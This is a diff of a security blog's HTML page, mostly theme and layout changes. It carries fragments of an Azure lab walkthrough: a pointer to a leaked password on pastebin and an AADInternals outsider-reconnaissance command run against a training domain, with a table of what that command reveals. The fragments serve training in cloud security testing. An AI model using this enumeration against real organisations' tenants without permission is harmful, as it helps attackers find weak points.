   "inLanguage": "en",
   "datePublished": "2024-10-28T14:13:44+01:00",
@@ -101,15 +102,13 @@
 </head>
 <body id="top">
     <header class="header">
-    <nav class="nav">
+    <nav class="header-nav">
         <div class="logo">
             <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
                 <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
                     height="25">SecFortress</a>
-            <div class="logo-switches">
-            </div>
         </div>
-        <ul id="menu">
+        <ul id="menu" class="menu">
             <li>
                 <a href="http://localhost:1313/" title="Home">
                     <span>Home</span>
@@ -153,32 +152,43 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/hacking/">Hackings</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
     <h1 class="post-title entry-hint-parent">
       Azure Recon to Foothold and Profit
     </h1>
     <div class="post-description">
       Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment
     </div>
-    <div class="post-meta"><span title='2024-10-28 14:13:44 +0100 WAT'>October 28, 2024</span>&nbsp;·&nbsp;<span>10 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+    <div class="post-meta">
+
+<span title='2024-10-28 14:13:44 +0100 WAT'>October 28, 2024</span>&nbsp;·&nbsp;<span>10 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
 
 </div>
-  </header> <div class="toc">
-    <details >
-        <summary accesskey="c" title="(Alt + C)">
-            <span class="details">Table of Contents</span>
-        </summary>
+  </header> <details class="toc" >
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
 
-        <div class="inner"><nav id="TableOfContents">
+    <div class="inner"><nav id="TableOfContents">
   <ul>
     <li><a href="#walkthrough"><strong>WalkThrough</strong></a></li>
   </ul>
 </nav>
-        </div>
-    </details>
-</div>
+    </div>
+</details>
 
-  <div class="post-content"><p><strong>Note : This article was inspired by content from <a href="https://pwnedlabs.io/labs/azure-recon-to-foothold-and-profit">Pwned Labs</a>. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.</strong></p>
+  <div class="post-content md-content"><p><strong>Note : This article was inspired by content from <a href="https://pwnedlabs.io/labs/azure-recon-to-foothold-and-profit">Pwned Labs</a>. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.</strong></p>
 <p><img loading="lazy" src="/b09c1a5729661d9abce16e7c454acadc.gif#center"></p>
 <h2 id="walkthrough"><strong>WalkThrough</strong><a hidden class="anchor" aria-hidden="true" href="#walkthrough">#</a></h2>
 <p>A possible password leak was found on <a href="https://pastebin.com/ZfqZdpX8">pastebin</a></p>
@@ -254,50 +264,50 @@
 </span></span><span class="line"><span class="cl"><span class="n">2590ccef</span><span class="p">-</span><span class="mf">687d</span><span class="p">-</span><span class="n">493b-ae8d</span><span class="p">-</span><span class="n">441cbab63a72</span>
 </span></span></code></pre></div><p>We can also run the next command, which looks to answer the following questions as described by <strong>PwnedLabs</strong> :</p>
 <table>
-  <thead>
-      <tr>
-          <th>Value</th>
-          <th>Description</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>DNS</td>
-          <td>Does the DNS record exist?</td>
-      </tr>
-      <tr>
-          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online">MX</a></td>
-          <td>Does the MX point to Office 365?</td>
-      </tr>
-      <tr>
-          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online">SPF</a></td>
-          <td>Does the SPF contain Exchange Online?</td>
-      </tr>
-      <tr>
-          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/deploy-identity-solution-identity-model?#authentication-for-hybrid-identity">Type</a></td>
-          <td>Federated or Managed</td>
-      </tr>
-      <tr>
-          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dmarc-configure">DMARC</a></td>
-          <td>Is the DMARC record configured?</td>
-      </tr>
-      <tr>
-          <td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dkim-configure">DKIM</a></td>
-          <td>Is the DKIM record configured?</td>
-      </tr>
-      <tr>
-          <td><a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-mta-sts-for-exchange-online/ba-p/3106386">MTA-STS</a></td>
-          <td>Is the MTA-STS recored configured?</td>
-      </tr>
-      <tr>
-          <td>STS</td>
-          <td>The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server</td>
-      </tr>
-      <tr>
-          <td><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/operations/create-a-relying-party-trust">RPS</a></td>
-          <td>Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.</td>
-      </tr>
-  </tbody>
+	<thead>
+			<tr>
+					<th>Value</th>
+					<th>Description</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>DNS</td>
+					<td>Does the DNS record exist?</td>
+			</tr>
+			<tr>
+					<td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online">MX</a></td>
+					<td>Does the MX point to Office 365?</td>
+			</tr>
+			<tr>
+					<td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online">SPF</a></td>
+					<td>Does the SPF contain Exchange Online?</td>
+			</tr>
+			<tr>
+					<td><a href="https://learn.microsoft.com/en-us/microsoft-365/enterprise/deploy-identity-solution-identity-model?#authentication-for-hybrid-identity">Type</a></td>
+					<td>Federated or Managed</td>
+			</tr>
+			<tr>
+					<td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dmarc-configure">DMARC</a></td>
+					<td>Is the DMARC record configured?</td>
+			</tr>
+			<tr>
+					<td><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dkim-configure">DKIM</a></td>
+					<td>Is the DKIM record configured?</td>
+			</tr>
+			<tr>
+					<td><a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-mta-sts-for-exchange-online/ba-p/3106386">MTA-STS</a></td>
+					<td>Is the MTA-STS recored configured?</td>
+			</tr>
+			<tr>
+					<td>STS</td>
+					<td>The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server</td>
+			</tr>
+			<tr>
+					<td><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/operations/create-a-relying-party-trust">RPS</a></td>
+					<td>Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.</td>
+			</tr>
+	</tbody>
 </table>
 <p>Source: <a href="https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider">https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider</a></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Invoke-AADIntReconAsOutsider</span> <span class="n">-Domain</span> <span class="s2">&#34;megabigtech.com&#34;</span> <span class="p">|</span> <span class="nb">Format-Table</span>
@@ -552,12 +562,10 @@ Connect-MgGraph
 <nav class="paginav">
   <a class="prev" href="http://localhost:1313/hacking/bypass_azure_web_app_authentication_with_path_traversal/">
     <span class="title">« Prev</span>
-    <br>
     <span>Bypass Azure Web App Authentication with Path Traversal</span>
   </a>
   <a class="next" href="http://localhost:1313/hacking/unmask_privileged_access_in_azure/">
     <span class="title">Next »</span>
-    <br>
     <span>Unmask Privileged Access In Azure</span>
   </a>
 </nav>
@@ -567,17 +575,21 @@ Connect-MgGraph
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+        <span>&copy; 2026 <a href="http://localhost:1313/">SecFortress</a></span> · 
 
+    
+    
     <span>
         Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
         <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
     </span>
 </footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
     </svg>
 </a>
 
@@ -616,14 +628,13 @@ Connect-MgGraph
 
 </script>
 <script>
-    var mybutton = document.getElementById("top-link");
+    var toplink = document.getElementById("top-link");
     window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
         } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
+            toplink.classList.add("hidden");
         }
     };
 
